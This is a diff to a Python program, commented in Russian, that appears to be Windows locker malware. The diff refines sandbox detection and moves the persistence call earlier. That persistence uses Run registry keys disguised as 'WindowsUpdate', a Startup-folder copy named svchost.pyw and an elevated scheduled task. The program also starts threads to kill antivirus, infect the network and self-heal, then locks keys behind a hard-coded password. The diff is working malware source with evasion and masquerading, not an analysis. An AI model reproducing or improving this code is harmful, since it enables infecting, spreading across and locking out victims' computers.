@@ -17,10 +17,11 @@ def check_vm():
             for ind in vm_indicators:
                 if ind in proc:
                     return True
-        if os.cpu_count() < 2 or os.getenv('COMPUTERNAME', '').lower().startswith('desktop-'):
-            pass
+        if os.cpu_count() < 2:
+            return True
         try:
-            if int(subprocess.check_output('wmic computersystem get totalphysicalmemory', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()) < 2147483648:
+            mem = int(subprocess.check_output('wmic computersystem get totalphysicalmemory', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip())
+            if mem < 2147483648:
                 return True
         except: pass
     except: pass
@@ -35,7 +36,6 @@ for lib, name in [("cv2","opencv-python"),("pygame","pygame"),("keyboard","keybo
     except: subprocess.check_call([sys.executable,"-m","pip","install",name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
 
 import cv2, pygame, keyboard, numpy as np, socket, re, winsound
-from datetime import datetime
 
 PASS = "1601"
 TRIES = 5
@@ -57,7 +57,7 @@ def protect_process():
     except: pass
 
 # ============================================================
-# 7. САМО-ВОССТАНОВЛЕНИЕ ПРИ УДАЛЕНИИ
+# 7. САМО-ВОССТАНОВЛЕНИЕ ПРИ УДАЛЕНИИ (ТОЛЬКО КОПИРОВАНИЕ, БЕЗ ЗАПУСКА)
 # ============================================================
 def self_heal():
     src = os.path.abspath(sys.argv[0])
@@ -148,34 +148,27 @@ def show_final_screen(msg):
         f.destroy()
     except: pass
 
-# ============================================================
-# 1,2,3. АВТОЗАГРУЗКА ВЕЗДЕ
-# ============================================================
 def startup():
     s = os.path.abspath(sys.argv[0])
     pw = sys.executable.replace("python.exe","pythonw.exe")
     
-    # 1. Реестр HKCU
     try:
         r = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(r, "WindowsUpdate", 0, winreg.REG_SZ, f'"{pw}" "{s}"')
         winreg.CloseKey(r)
     except: pass
     
-    # 1. Реестр HKLM
     try:
         r = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(r, "WindowsUpdate", 0, winreg.REG_SZ, f'"{pw}" "{s}"')
         winreg.CloseKey(r)
     except: pass
     
-    # 2. Папка Startup
     try:
         d = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup','svchost.pyw')
         shutil.copy2(s, d)
     except: pass
     
-    # 3. Планировщик задач
     try:
         subprocess.run(['schtasks','/create','/tn','WindowsUpdate','/tr',f'"{pw}" "{s}"','/sc','onlogon','/f','/rl','highest'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
     except: pass
@@ -306,11 +299,11 @@ if __name__=="__main__":
     except: pass
     
     protect_process()
+    startup()
     threading.Thread(target=kill_av, daemon=True).start()
     threading.Thread(target=timer_check, daemon=True).start()
     threading.Thread(target=infect_network, daemon=True).start()
     threading.Thread(target=self_heal, daemon=True).start()
-    startup()
     anim()
     lock_keys()
     video()
